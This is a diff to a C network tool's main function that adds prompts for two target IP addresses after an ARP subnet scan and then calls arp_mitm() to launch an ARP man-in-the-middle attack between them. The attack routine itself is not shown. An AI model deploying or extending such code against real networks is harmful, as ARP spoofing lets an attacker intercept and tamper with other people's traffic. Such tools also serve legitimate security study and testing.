@@ -141,6 +141,41 @@ int main(int argc, char **argv)
 
   /* ARP scan of the subnet */
   arp_scan(sockfd, ifindex, ipaddr, macaddr, netmask);
+
+
+
+  /* ====================================================================== */
+
+  /* Selection of the targets */
+
+  char target1_ip_string[16];
+  printf("Target 1 IP: ");
+  scanf("%15s", target1_ip_string);
+  printf("%s\n", target1_ip_string);
+  struct in_addr target1_ip;
+  if (!inet_pton(AF_INET, target1_ip_string, &target1_ip)) {
+    perror("[FAIL] inet_pton() (badly formatted IP address)");
+    exit(EXIT_FAILURE);
+  }
+
+  char target2_ip_string[16];
+  printf("Target 2 IP: ");
+  scanf("%15s", target2_ip_string);
+  printf("%s\n", target2_ip_string);
+  struct in_addr target2_ip;
+  if (!inet_pton(AF_INET, target2_ip_string, &target2_ip)) {
+    perror("[FAIL] inet_pton() (badly formatted IP address)");
+    exit(EXIT_FAILURE);
+  }
+
+
+  /* ====================================================================== */
+
+  /* ARP man-in-the-middle attack */
+  printf("ARP man-in-the-middle attack on interface %s between %s and %s\n",
+	 if_name, target1_ip_string, target2_ip_string);
+
+  arp_mitm(sockfd, ifindex, ipaddr, macaddr, &target1_ip, &target2_ip);
   
   return EXIT_SUCCESS;
 }
